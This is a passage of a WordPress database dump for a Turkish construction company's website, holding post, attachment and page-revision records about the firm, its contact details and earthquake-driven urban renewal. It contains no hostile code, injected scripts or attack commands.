INSERT INTO `cmrfu_posts` VALUES("826","1","2014-06-02 12:28:12","2014-06-02 09:28:12","","3","","inherit","open","open","","3","","","2014-06-02 12:28:12","2014-06-02 09:28:12","","186","http://herkonyapi.com/wp-content/uploads/2013/10/3.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("827","1","2014-06-02 12:28:14","2014-06-02 09:28:14","","4","","inherit","open","open","","4","","","2014-06-02 12:28:14","2014-06-02 09:28:14","","186","http://herkonyapi.com/wp-content/uploads/2013/10/4.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("828","1","2014-06-02 12:28:16","2014-06-02 09:28:16","","5","","inherit","open","open","","5","","","2014-06-02 12:28:16","2014-06-02 09:28:16","","186","http://herkonyapi.com/wp-content/uploads/2013/10/5.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("829","1","2014-06-02 12:28:18","2014-06-02 09:28:18","","6","","inherit","open","open","","6","","","2014-06-02 12:28:18","2014-06-02 09:28:18","","186","http://herkonyapi.com/wp-content/uploads/2013/10/6.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("830","1","2014-06-02 12:28:19","2014-06-02 09:28:19","","7","","inherit","open","open","","7","","","2014-06-02 12:28:19","2014-06-02 09:28:19","","186","http://herkonyapi.com/wp-content/uploads/2013/10/7.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("831","1","2014-06-02 12:28:21","2014-06-02 09:28:21","","8","","inherit","open","open","","8","","","2014-06-02 12:28:21","2014-06-02 09:28:21","","186","http://herkonyapi.com/wp-content/uploads/2013/10/8.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("832","1","2014-06-02 12:28:23","2014-06-02 09:28:23","","9","","inherit","open","open","","9-2","","","2014-06-02 12:28:23","2014-06-02 09:28:23","","186","http://herkonyapi.com/wp-content/uploads/2013/10/91.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("833","1","2014-06-02 12:28:25","2014-06-02 09:28:25","","10","","inherit","open","open","","10","","","2014-06-02 12:28:25","2014-06-02 09:28:25","","186","http://herkonyapi.com/wp-content/uploads/2013/10/10.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("996","1","2014-08-30 00:26:52","2014-08-29 21:26:52","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Binamı Yeniletmek İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Binamı Yeniletmek İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-08-30 00:26:52","2014-08-29 21:26:52","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("994","1","2014-08-29 23:48:52","2014-08-29 20:48:52","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-08-29 23:48:52","2014-08-29 20:48:52","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("913","1","2014-06-02 13:53:57","2014-06-02 10:53:57","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Home","","inherit","open","open","","524-revision-v1","","","2014-06-02 13:53:57","2014-06-02 10:53:57","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("837","1","2014-06-02 13:07:47","2014-06-02 10:07:47","","Alpay Konak Kat 3","","inherit","open","open","","184-autosave-v1","","","2014-06-02 13:07:47","2014-06-02 10:07:47","","184","http://herkonyapi.com/184-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("838","1","2014-06-02 13:07:54","2014-06-02 10:07:54","","New_1","","inherit","open","open","","new_1","","","2014-06-02 13:07:54","2014-06-02 10:07:54","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_1.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("839","1","2014-06-02 13:08:29","2014-06-02 10:08:29","","New_1","","inherit","open","open","","new_1-2","","","2014-06-02 13:08:29","2014-06-02 10:08:29","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_11.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("840","1","2014-06-02 13:08:30","2014-06-02 10:08:30","","New_2","","inherit","open","open","","new_2","","","2014-06-02 13:08:30","2014-06-02 10:08:30","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_2.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("841","1","2014-06-02 13:08:32","2014-06-02 10:08:32","","New_3","","inherit","open","open","","new_3","","","2014-06-02 13:08:32","2014-06-02 10:08:32","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_3.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("842","1","2014-06-02 13:08:34","2014-06-02 10:08:34","","New_4","","inherit","open","open","","new_4","","","2014-06-02 13:08:34","2014-06-02 10:08:34","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_4.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("843","1","2014-06-02 13:08:36","2014-06-02 10:08:36","","New_5","","inherit","open","open","","new_5","","","2014-06-02 13:08:36","2014-06-02 10:08:36","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_5.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("844","1","2014-06-02 13:08:37","2014-06-02 10:08:37","","New_6","","inherit","open","open","","new_6","","","2014-06-02 13:08:37","2014-06-02 10:08:37","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_6.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("845","1","2014-06-02 13:08:39","2014-06-02 10:08:39","","New_7","","inherit","open","open","","new_7","","","2014-06-02 13:08:39","2014-06-02 10:08:39","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_7.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("846","1","2014-06-02 13:08:41","2014-06-02 10:08:41","","New_8","","inherit","open","open","","new_8","","","2014-06-02 13:08:41","2014-06-02 10:08:41","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_8.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("847","1","2014-06-02 13:08:43","2014-06-02 10:08:43","","New_9","","inherit","open","open","","new_9","","","2014-06-02 13:08:43","2014-06-02 10:08:43","","184","http://herkonyapi.com/wp-content/uploads/2013/10/New_9.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("853","1","2014-06-02 13:13:33","2014-06-02 10:13:33","","10","","inherit","open","open","","10-2","","","2014-06-02 13:13:33","2014-06-02 10:13:33","","182","http://herkonyapi.com/wp-content/uploads/2013/10/101.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("859","1","2014-06-02 13:16:13","2014-06-02 10:16:13","","12","","inherit","open","open","","12","","","2014-06-02 13:16:13","2014-06-02 10:16:13","","177","http://herkonyapi.com/wp-content/uploads/2013/10/121.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("865","1","2014-06-02 13:20:17","2014-06-02 10:20:17","","New_6","","inherit","open","open","","new_6-2","","","2014-06-02 13:20:17","2014-06-02 10:20:17","","173","http://herkonyapi.com/wp-content/uploads/2013/10/New_61.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("871","1","2014-06-02 13:22:48","2014-06-02 10:22:48","","6","","inherit","open","open","","6-4","","","2014-06-02 13:22:48","2014-06-02 10:22:48","","166","http://herkonyapi.com/wp-content/uploads/2013/10/63.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("872","1","2014-06-02 13:22:49","2014-06-02 10:22:49","","8","","inherit","open","open","","8-3","","","2014-06-02 13:22:49","2014-06-02 10:22:49","","166","http://herkonyapi.com/wp-content/uploads/2013/10/82.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("881","1","2014-06-02 13:31:03","2014-06-02 10:31:03","","Şişli Fikri Bey Apt. 3+1 Ön","","inherit","open","open","","151-autosave-v1","","","2014-06-02 13:31:03","2014-06-02 10:31:03","","151","http://herkonyapi.com/151-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("880","1","2014-06-02 13:30:57","2014-06-02 10:30:57","","Şişli Fikri Bey Apt. 3+1","","inherit","open","open","","159-autosave-v1","","","2014-06-02 13:30:57","2014-06-02 10:30:57","","159","http://herkonyapi.com/159-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("914","1","2014-06-02 13:56:22","2014-06-02 10:56:22","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-06-02 13:56:22","2014-06-02 10:56:22","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("930","1","2014-08-29 22:28:33","2014-08-29 19:28:33","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 261 61 50 - 52[/list_item]

[list_item icon=\"phone-sign\"]+90 532 255 15 90[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-08-29 22:28:33","2014-08-29 19:28:33","","447","http://herkonyapi.com/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("931","1","2014-08-29 22:29:35","2014-08-29 19:29:35","[cols]
[col-9]

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Kurumsal","","inherit","open","open","","497-revision-v1","","","2014-08-29 22:29:35","2014-08-29 19:29:35","","497","http://herkonyapi.com/497-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("932","1","2014-08-29 22:35:30","2014-08-29 19:35:30","<h3>Binaları Neden Yeniliyoruz</h3>
İstanbul ve yakınlarında yaşanan hasar yapıcı depremler sonrası bölgedeki binaların çoğunun depremlere karşı dayanıksız olduğu ortaya çıkmıştır. Muhtemel bir depremde can ve mal kaybını en aza indirmenin yolu, yeni yapılacak binaların güvenli yaşam alanlarına dönüştürülmesidir.

Herkon Yapı, eskiyen ve ekonomik ömrünü doldurmuş binaları yıkıp, depreme dayanıklı, semt dokusuna uygun ve akıllı bina özelliklerine sahip, yeni yaşam alanlarına dönüştürüyor.

31 Mayıs 2012 tarihinde yürürlüğe girmiş bulunan 6306 sayılı Kanuna göre; eski bir bina için, Bakanlıkça onaylanmış “ekonomik ömrünü tamamlamış” olduğu konusunda bir rapor verilir ise; arsa sahipleri yeniden yaptırma, müteahhit seçimi, yeni dairelerin büyüklüğü gibi konularda artık \"oybirliği\" ile değil, üçte iki çoğunlukla karar verilmektedir. Bu şekilde ekonomik ömrünü tamamlamış olan binalar için tüm maliklerinin muvafakati aranmamakta, yeniden inşa sadece bir veya iki daire veya dükkân sahibinin karşı çıkmasıyla engellenememektedir.

Dolayısı ile ülke genelinde kamu sağlığını ve güvenliğini tehdit eden, depreme karşı da dayanıksız olan bu binaların yenilenmelerinin önündeki “oybirliği” engeli kaldırılmıştır.
<h3>Deprem Gerçeği</h3>
Çevre ve Şehircilik Bakanlığı, İstanbul\'da bina yönetmelikleri ile ilgili olarak İnşaat Mühendislerine eğitim veriyor. Bu deprem eğitimleri Eskişehir, Samsun, Nevşehir, Trabzon, Çanakkale, Gaziantep ve İzmir\'de de veriliyor.

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/03/20070306-3.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında esaslar, 6 Mart 2007 Salı günü 26454 sayılı Resmi Gazete\'de yayınlandı.</a>

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/05/20070503-8.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında yönetmelikte değişiklik yapılmasına ilişkin yönetmelik, 3 Mayıs 2007 tarihinde ve 26511 sayılı Resmi Gazete\'de yayınlandı.</a>","Kentsel Dönüşüm","","publish","open","open","","kentsel-donusum","","","2014-08-29 22:45:22","2014-08-29 19:45:22","","0","http://herkonyapi.com/?page_id=932","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("933","1","2014-08-29 22:35:30","2014-08-29 19:35:30","<h3>Binaları Neden Yeniliyoruz</h3>
İstanbul ve yakınlarında yaşanan hasar yapıcı depremler sonrası bölgedeki binaların çoğunun depremlere karşı dayanıksız olduğu ortaya çıkmıştır. Muhtemel bir depremde can ve mal kaybını en aza indirmenin yolu, yeni yapılacak binaların güvenli yaşam alanlarına dönüştürülmesidir.

Herkon Yapı, eskiyen ve ekonomik ömrünü doldurmuş binaları yıkıp, depreme dayanıklı, semt dokusuna uygun ve akıllı bina özelliklerine sahip, yeni yaşam alanlarına dönüştürüyor.

31 Mayıs 2012 tarihinde yürürlüğe girmiş bulunan 6306 sayılı Kanuna göre; eski bir bina için, Bakanlıkça onaylanmış “ekonomik ömrünü tamamlamış” olduğu konusunda bir rapor verilir ise; arsa sahipleri yeniden yaptırma, müteahhit seçimi, yeni dairelerin büyüklüğü gibi konularda artık \"oybirliği\" ile değil, üçte iki çoğunlukla karar verilmektedir. Bu şekilde ekonomik ömrünü tamamlamış olan binalar için tüm maliklerinin muvafakati aranmamakta, yeniden inşa sadece bir veya iki daire veya dükkân sahibinin karşı çıkmasıyla engellenememektedir.

Dolayısı ile ülke genelinde kamu sağlığını ve güvenliğini tehdit eden, depreme karşı da dayanıksız olan bu binaların yenilenmelerinin önündeki “oybirliği” engeli kaldırılmıştır.
<h3>Deprem Gerçeği</h3>
Çevre ve Şehircilik Bakanlığı, İstanbul\'da bina yönetmelikleri ile ilgili olarak İnşaat Mühendislerine eğitim veriyor. Bu deprem eğitimleri Eskişehir, Samsun, Nevşehir, Trabzon, Çanakkale, Gaziantep ve İzmir\'de de veriliyor.

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/03/20070306-3.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında esaslar, 6 Mart 2007 Salı günü 26454 sayılı Resmi Gazete\'de yayınlandı.</a>

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/05/20070503-8.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında yönetmelikte değişiklik yapılmasına ilişkin yönetmelik, 3 Mayıs 2007 tarihinde ve 26511 sayılı Resmi Gazete\'de yayınlandı.</a>","Kentsel Dönüşüm","","inherit","open","open","","932-revision-v1","","","2014-08-29 22:35:30","2014-08-29 19:35:30","","932","http://herkonyapi.com/932-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("934","1","2014-08-29 22:36:01","2014-08-29 19:36:01"," ","","","publish","open","open","","934","","","2014-08-29 22:50:56","2014-08-29 19:50:56","","0","http://herkonyapi.com/?p=934","6","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("935","1","2014-08-29 22:40:05","2014-08-29 19:40:05","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/bina-yenileme-11.jpg\"><img class=\"alignnone size-full wp-image-936\" alt=\"bina-yenileme-11\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/bina-yenileme-11.jpg\" width=\"600\" height=\"333\" /></a>

İstanbul ve yakınlarında yaşanan hasar yapıcı depremler sonrası bölgedeki binaların çoğunun depremlere karşı dayanıksız olduğu ortaya çıkmıştır. Muhtemel bir depremde can ve mal kaybını en aza indirmenin yolu, yeni yapılacak binaların güvenli yaşam alanlarına dönüştürülmesidir.

Herkon Yapı, eskiyen ve ekonomik ömrünü doldurmuş binaları yıkıp, depreme dayanıklı, semt dokusuna uygun ve akıllı bina özelliklerine sahip, yeni yaşam alanlarına dönüştürüyor.

31 Mayıs 2012 tarihinde yürürlüğe girmiş bulunan 6306 sayılı Kanuna göre; eski bir bina için, Bakanlıkça onaylanmış “ekonomik ömrünü tamamlamış” olduğu konusunda bir rapor verilir ise; arsa sahipleri yeniden yaptırma, müteahhit seçimi, yeni dairelerin büyüklüğü gibi konularda artık “oybirliği” ile değil, üçte iki çoğunlukla karar verilmektedir. Bu şekilde ekonomik ömrünü tamamlamış olan binalar için tüm maliklerinin muvafakati aranmamakta, yeniden inşa sadece bir veya iki daire veya dükkân sahibinin karşı çıkmasıyla engellenememektedir.

Dolayısı ile ülke genelinde kamu sağlığını ve güvenliğini tehdit eden, depreme karşı da dayanıksız olan bu binaların yenilenmelerinin önündeki “oybirliği” engeli kaldırılmıştır.","Neden Kentsel Dönüşüm","","publish","open","open","","neden-kentsel-donusum","","","2014-08-29 22:44:51","2014-08-29 19:44:51","","0","http://herkonyapi.com/?page_id=935","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("936","1","2014-08-29 22:39:18","2014-08-29 19:39:18","","bina-yenileme-11","","inherit","open","open","","bina-yenileme-11","","","2014-08-29 22:39:18","2014-08-29 19:39:18","","935","http://herkonyapi.com/wp-content/uploads/2014/08/bina-yenileme-11.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("937","1","2014-08-29 22:40:05","2014-08-29 19:40:05","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/bina-yenileme-11.jpg\"><img class=\"alignnone size-full wp-image-936\" alt=\"bina-yenileme-11\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/bina-yenileme-11.jpg\" width=\"600\" height=\"333\" /></a>

İstanbul ve yakınlarında yaşanan hasar yapıcı depremler sonrası bölgedeki binaların çoğunun depremlere karşı dayanıksız olduğu ortaya çıkmıştır. Muhtemel bir depremde can ve mal kaybını en aza indirmenin yolu, yeni yapılacak binaların güvenli yaşam alanlarına dönüştürülmesidir.

Herkon Yapı, eskiyen ve ekonomik ömrünü doldurmuş binaları yıkıp, depreme dayanıklı, semt dokusuna uygun ve akıllı bina özelliklerine sahip, yeni yaşam alanlarına dönüştürüyor.

31 Mayıs 2012 tarihinde yürürlüğe girmiş bulunan 6306 sayılı Kanuna göre; eski bir bina için, Bakanlıkça onaylanmış “ekonomik ömrünü tamamlamış” olduğu konusunda bir rapor verilir ise; arsa sahipleri yeniden yaptırma, müteahhit seçimi, yeni dairelerin büyüklüğü gibi konularda artık “oybirliği” ile değil, üçte iki çoğunlukla karar verilmektedir. Bu şekilde ekonomik ömrünü tamamlamış olan binalar için tüm maliklerinin muvafakati aranmamakta, yeniden inşa sadece bir veya iki daire veya dükkân sahibinin karşı çıkmasıyla engellenememektedir.

Dolayısı ile ülke genelinde kamu sağlığını ve güvenliğini tehdit eden, depreme karşı da dayanıksız olan bu binaların yenilenmelerinin önündeki “oybirliği” engeli kaldırılmıştır.","Neden Kentsel Dönüşüm","","inherit","open","open","","935-revision-v1","","","2014-08-29 22:40:05","2014-08-29 19:40:05","","935","http://herkonyapi.com/935-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("944","1","2014-08-29 22:47:43","2014-08-29 19:47:43","<a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\"><img class=\" wp-image-997 alignright\" alt=\"4\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/4.jpg\" width=\"406\" height=\"573\" /></a>

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","publish","open","open","","herkon-yapi","","","2014-08-30 00:39:37","2014-08-29 21:39:37","","0","http://herkonyapi.com/?page_id=944","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("945","1","2014-08-29 22:47:43","2014-08-29 19:47:43","Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

